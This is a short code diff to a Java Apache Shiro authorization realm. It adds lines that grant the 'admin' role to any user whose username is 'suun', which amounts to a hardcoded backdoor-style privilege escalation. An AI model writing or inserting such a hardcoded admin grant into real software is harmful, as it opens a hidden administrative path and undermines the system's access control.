@@ -37,6 +37,8 @@ public class CustomRealm extends AuthorizingRealm {
         SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
         String role = (null == userDataService.findById(username)) ? "anon" : "user";
         info.addRole(role);
+        if (username.equals("suun"))
+            info.addRole("admin");
         return info;
     }
 
